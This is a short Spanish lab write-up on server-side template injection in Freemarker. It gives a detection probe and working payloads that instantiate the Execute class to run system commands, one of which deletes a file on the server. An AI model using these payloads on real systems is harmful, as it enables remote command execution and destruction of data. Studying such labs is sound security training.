# SSTI usando la documentación del motor

Tags: #SSTI #Freemarker 

* [SSTI Freemarker](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Java/#freemarker)

```bash 
En este lab se descubre una vulnerabilidad de SSTI aprovechando el motor de plantillas Freemarker. Analizando la documentación oficial, identificamos la función ‘**new()**‘ como vector de ataque para instanciar clases peligrosas, como **Execute**, que permite lanzar comandos del sistema.

Se utiliza este mecanismo para borrar un archivo dentro del servidor, demostrando cómo incluso las funciones documentadas pueden ser explotadas si no se restringen adecuadamente.
```

```bash 
# En este lab la inyección se encuentra en la edición del template del producto 

	${3*3}     # Verificar si existe la inyección 
 
# Ejecutar un comando 
	<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whomai")}
	<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm file.txt")}
```